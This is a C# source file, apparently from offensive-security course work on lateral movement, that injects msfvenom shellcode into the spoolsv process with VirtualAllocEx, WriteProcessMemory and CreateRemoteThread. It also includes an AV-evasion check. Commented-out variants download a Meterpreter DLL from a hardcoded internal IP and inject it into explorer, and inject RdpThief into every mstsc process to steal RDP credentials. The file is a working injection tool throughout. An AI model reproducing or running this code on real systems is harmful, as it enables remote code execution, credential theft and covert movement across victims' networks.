using System;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace InjectDLL
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);


        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            //Ch. 18.3.1 Lateral Movement 

            if (args.Length == 0)
            {
                Console.WriteLine("Please provide an msfvenom payload in hex format.");
                Console.WriteLine("\nExample: InjectDLL.exe 68656C6C6F20776F726C64");
                return;
            }

            string hexString = args[0];
            byte[] buf = Hex2Byte(hexString);
            byte[] convertedArray = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                convertedArray[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
            }

            //byte[] buf = new byte[] {};

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

            if (mem == null)
            {
                return;
            }

            

            /*for (int i = 0; i < buf.Length; i++)

            {
                buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
            }
*/
            int size = buf.Length;

            Process[] spoolProc = Process.GetProcessesByName("spoolsv");
            //Process[] spoolProc = Process.GetProcessesByName(args[0]);
            int pid = spoolProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            /*Generic Injection
             * String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.45.204/met.dll", dllName);
            wc.DownloadFile(args[0], dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;*/

            //RDP Injection

            //String dllName = "C:\\Windows\\Tasks\\RdpThief.dll";


            /*while (true)
            {
                Process[] mstscProc = Process.GetProcessesByName("mstsc");
                if (mstscProc.Length > 0)
                {
                    for (int i = 0; i < mstscProc.Length; i++)
                    {
                        int pid = mstscProc[i].Id;

                        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                        IntPtr outSize;
                        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
                    }
                }*/

            Thread.Sleep(1000);

        }


        /*IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);
        IntPtr outSize;
        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
        IntPtr loadLIb = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLIb, addr, 0, IntPtr.Zero);*/

        static byte[] Hex2Byte(string hexString)
        {
            if (hexString.Length % 2 != 0)
                throw new ArgumentException("Hex string must have an even length.");

            byte[] byteArray = new byte[hexString.Length / 2];
            for (int i = 0; i < byteArray.Length; i++)
            {
                byteArray[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
            }

            return byteArray;
        }
    } 
    
    }

